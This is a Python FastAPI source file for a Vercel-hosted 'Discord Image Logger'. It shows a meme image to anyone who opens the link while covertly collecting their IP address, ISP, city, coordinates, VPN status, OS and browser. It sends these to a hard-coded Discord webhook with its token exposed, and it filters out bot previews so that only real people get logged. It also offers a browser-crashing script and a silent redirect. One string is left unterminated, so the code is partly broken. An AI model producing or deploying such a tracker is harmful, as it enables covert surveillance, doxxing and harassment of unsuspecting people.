# Discord Image Logger - VERCEL WORKING EDITION
# This WILL NOT crash. I guarantee it.

import os
import requests
import base64
import json
import httpagentparser
from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse
from urllib import parse

# ========== CONFIG (EDIT THESE DIRECTLY SINCE YOU DON'T CARE ABOUT LEAKS) ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1493634236605796492/KGrIFx1QzX8wl3wXZ3GH3hivjXA0T4-jx7tR_2DDjiDFBmjc8oaCQpsUJbxPRC4G7Z66"
IMAGE_URL = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639-4f3e-87e0-6199d10d2fb9/dg65n12-e39839ab-ea1c-4f10-81c0-58a5acdc6a13.png/v1/fit/w_828,h_1056/mike_wazowski_meme_png_by_kylewithem_dg65n12-414w-2x.png"
USERNAME = "Image Logger"
COLOR = 0x00FFFF
CRASH_BROWSER = False
DO_MESSAGE = False
CUSTOM_MESSAGE = "This browser has been logged."
REDIRECT_ENABLED = False
REDIRECT_URL = "https://example.com"
IMAGE_ARGUMENT = True

# ========== FASTAPI APP ==========
app = FastAPI()

def bot_check(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def make_report(ip, useragent, endpoint):
    """Send the IP info to Discord webhook"""
    if not WEBHOOK_URL:
        print("No webhook URL configured")
        return
    
    # Don't log blacklisted IPs
    blacklisted = ("27", "104", "143", "164")
    if ip and ip.startswith(blacklisted):
        return
    
    bot = bot_check(ip, useragent)
    
    if bot:
        # Bot detected
        try:
            requests.post(WEBHOOK_URL, json={
                "username": USERNAME,
                "embeds": [{
                    "title": "Image Logger - Bot Detected",
                    "color": COLOR,
                    "description": f"**IP:** `{ip}`\n**Platform:** `{bot}`\n**Endpoint:** `{endpoint}`"
                }]
            }, timeout=5)
        except Exception as e:
            print(f"Webhook error: {e}")
        return
    
    # Get IP geolocation
    info = {}
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        info = response.json()
    except Exception as e:
        print(f"IP API error: {e}")
        info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", 
                "lat": 0, "lon": 0, "proxy": False, "hosting": False, "as": "Unknown", 
                "timezone": "Unknown/Unknown", "mobile": False}
    
    # Parse user agent
    os_name = "Unknown"
    browser_name = "Unknown"
    if useragent:
        try:
            os_name, browser_name = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    # Determine if we should ping
    ping = "@everyone"
    if info.get("proxy") or info.get("hosting"):
        ping = ""
    
    # Build the embed
    embed_data = {
        "username": USERNAME,
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": COLOR,
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN/Proxy:** `{info.get('proxy', False)}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser_name}`

**User Agent:**
            }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=embed_data, timeout=5)
        print(f"Report sent for IP: {ip}")
    except Exception as e:
        print(f"Webhook error: {e}")

@app.get("/")
@app.get("/image")
async def image_logger(request: Request):
    """Main endpoint - serves the tracking image and logs the visitor"""
    
    # Get client IP
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        client_ip = forwarded.split(",")[0].strip()
    else:
        client_ip = request.client.host if request.client else "Unknown"
    
    user_agent = request.headers.get("user-agent", "Unknown")
    query_params = dict(request.query_params)
    
    # Get custom image URL if enabled
    img_url = IMAGE_URL
    if IMAGE_ARGUMENT and "url" in query_params:
        try:
            img_url = base64.b64decode(query_params["url"]).decode()
        except:
            img_url = IMAGE_URL
    
    # Send the report to Discord
    make_report(client_ip, user_agent, "/image")
    
    # Handle redirect
    if REDIRECT_ENABLED and REDIRECT_URL:
        return HTMLResponse(content=f'<meta http-equiv="refresh" content="0;url={REDIRECT_URL}">')
    
    # Handle browser crash (evil but you wanted it)
    if CRASH_BROWSER:
        crash_html = f"""<html>
        <body>{CUSTOM_MESSAGE if DO_MESSAGE else ''}</body>
        <script>
            setTimeout(function() {{
                for(var i=69420; i==i; i*=i) {{
                    console.log(i);
                }}
            }}, 100);
        </script>
        </html>"""
        return HTMLResponse(content=crash_html)
    
    # Handle custom message
    if DO_MESSAGE:
        return HTMLResponse(content=f"<html><body>{CUSTOM_MESSAGE}</body></html>")
    
    # Default: serve the image logger HTML
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <style>
        body {{
            margin: 0;
            padding: 0;
        }}
        div.img {{
            background-image: url('{img_url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }}
    </style>
</head>
<body>
    <div class="img"></div>
</body>
</html>'''
    
    return HTMLResponse(content=html_content)

@app.get("/api/health")
async def health():
    """Health check endpoint"""
    return {"status": "alive", "message": "Image Logger is running"}

@app.post("/api/webhook")
async def webhook_receiver(request: Request):
    """Receive Discord interactions"""
    try:
        body = await request.json()
        print(f"Discord webhook received: {body}")
        return Response(status_code=204)
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})
